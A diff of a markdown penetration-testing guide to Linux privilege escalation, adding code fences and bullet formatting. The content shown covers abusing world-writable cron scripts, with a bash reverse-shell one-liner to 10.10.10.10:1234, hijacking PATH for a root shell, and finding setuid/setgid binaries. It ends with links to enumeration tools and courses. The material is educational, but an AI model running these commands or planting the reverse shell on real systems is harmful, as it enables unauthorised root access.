@@ -78,14 +78,14 @@ to run it: `./out.elf`
 # Cron Jobs
 
 Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
-
+```
 cat /etc/crontab                      # check for cron jobs
 locate example.sh                     # Find from where the file executes
 ls -l /usr/local/bin/example.sh       # check if the file is world-writable
 
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.10.10/1234 0>&1  # Overwrite the file with this simple one-liner, open up a listening port on 1234 and wait for the call-back
-
+```
 cat /etc/crontab                      # check for cron jobs, look for the PATH variable
 
 Here I will leave an example: /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin. In this case the PATH variable is /home/user, we are going to invoke a shell here with root priviliges.
@@ -130,7 +130,7 @@ tcpdump -i <interface> -s 65535 -w <file> # The command-line network traffic ana
 The flags setuid and setgid are needed for tasks that require different privileges than what the user is normally granted, such as the ability to alter system files or databases to change their login password. When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file's owner (commonly root) and/or the file's group, depending upon the flags set. I highly suggest to you to do your research on this topic because I can't cover everything in a single gitHub post.
 
 
-
+```
 find . -perm /6000                                                                  # Identify files where both the setuid and setgid flags are set
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null     # same just with a different command
 
@@ -146,6 +146,7 @@ From the strings output check the paths, from where the other executables are ca
 
 PATH=.:$PATH /usr/local/bin/example
 ./example
+```
 
 # Before finishing
 
@@ -153,16 +154,16 @@ This is just quick overview of this topic, as you can see, most of the time we o
 
 If permitted use automatization tools to not lose too much time on this part of the penetration testing process:
 
-https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
-https://github.com/The-Z-Labs/linux-exploit-suggester
+* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+* https://github.com/The-Z-Labs/linux-exploit-suggester
 
 Resources to help you understand better the privilige escalation process:
 
-https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06
-https://tryhackme.com/room/linuxprivescarena
-https://tryhackme.com/room/linuxprivesc
-https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+* https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06
+* https://tryhackme.com/room/linuxprivescarena
+* https://tryhackme.com/room/linuxprivesc
+* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
 
 
